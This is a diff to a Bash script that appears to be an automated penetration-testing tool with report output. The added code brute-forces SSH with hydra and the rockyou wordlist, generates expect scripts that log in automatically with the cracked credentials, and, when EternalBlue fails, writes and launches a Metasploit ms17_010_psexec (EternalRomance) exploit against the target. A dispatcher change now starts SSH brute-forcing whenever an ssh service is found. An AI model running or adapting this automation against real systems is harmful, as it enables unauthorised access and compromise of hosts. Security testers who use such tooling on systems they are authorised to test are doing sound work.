@@ -92,12 +92,16 @@ function sshBruteForce(){
 		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; bash'" 2> /dev/null
 		sleep 10
 	else
-		tmux new-window -n sshBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; read; bash'" \; 2> /dev/null
+		tmux new-window -n sshBruteForce "bash -c 'hydra -t 4 -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
 	grep "\[" $ips/sshPassword.txt > $ips/sshPass.txt
+
+	count=1
 	while read pass
 	do
+		username="$(echo "$pass"|cut -f7-7 -d' ')"
+		password="$(echo "$pass"|cut -f11-11 -d' ')"
 		if [ "$pass" != "" ]
 		then
 			description="SSH has a weak password, very easy to guess: <b style="color:red">$pass</b>"
@@ -105,6 +109,28 @@ function sshBruteForce(){
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
 		fi
+		if [ "$username" != "" ] && [ "$password" != "" ]
+		then
+			echo -e "Username: $username Password: $password"
+			cat <<- sshlogin > $(dirname $0)/exploits/ssh/sshlogin$count.exp
+				#!/usr/bin/expect -f
+				spawn ssh $username@$ips 
+				expect "(yes/no/[fingerprint])?"
+				send "yes\r"
+				expect "password"
+				send "$password\r"
+				expect ":~$ "
+				interact
+			sshlogin
+			chmod +x $(dirname $0)/exploits/ssh/sshlogin$count.exp
+			if [ "$tmux" = "bash" ]
+			then
+				gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
+			else
+				tmux split-window -t sshBruteForce "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
+			fi
+		fi
+		((count++))
 	done < $ips/sshPass.txt
 }
 function ftpBruteForce(){
@@ -303,6 +329,7 @@ function ms17_010_eternalblue(){
 		use exploit/windows/smb/ms17_010_eternalblue
 		set RHOSTS $ips
 		set LHOST $ip
+		spool $ips/notEternalBlue.txt
 		run
 	ms17_010_eternalblue
 	sleep 40
@@ -318,6 +345,26 @@ function ms17_010_eternalblue(){
 	remediation="Apart from implementing regular patch management to systems and networks, IT/system administrators are also recommended to adopt best practices such as enabling intrusion detection and prevention systems, disabling outdated or unnecessary protocols and ports (like 445), proactively monitoring network traffic, safeguarding the endpoints, and deploying security mechanisms such data categorization and network segmentation to mitigate damage in case of exposure. Employing virtual patching can also help against unknown vulnerabilities https://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/"
 	references="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue"
 	report2
+	notEternal=$(grep "but no session" $ips/notEternalBlue.txt|cut -f5-5 -d' ')
+	if [ "$notEternal" = "but no session" ]
+	then
+		cat <<- ms17_010_psexec > $(dirname $0)/exploits/smb/ms17_010_psexec.rc
+			use exploit/windows/smb/ms17_010_psexec
+			set RHOSTS $ips
+			set LHOST $ip
+			spool $ips/EternalRomance.txt
+			run
+		ms17_010_psexec
+		sleep 40
+		if [ "$tmux" = "bash" ]
+		then
+			gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
+			sleep 30
+		else
+			tmux new-window -n eternalRomance "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; read; bash'" \; 2> /dev/null
+			sleep 30
+		fi
+	fi
 }
 function ms08_067_netapi(){
 	if [ "$smbVersion" != "" ]
@@ -1384,6 +1431,9 @@ do
 		if [ "$name" = "rpcbind" ]
 		then
 			smbclient
+		elif [ "$name" = "ssh" ]
+		then
+			sshBruteForce
 		elif [ "$name" = "telnet" ]
 		then
 			telnetBruteForce
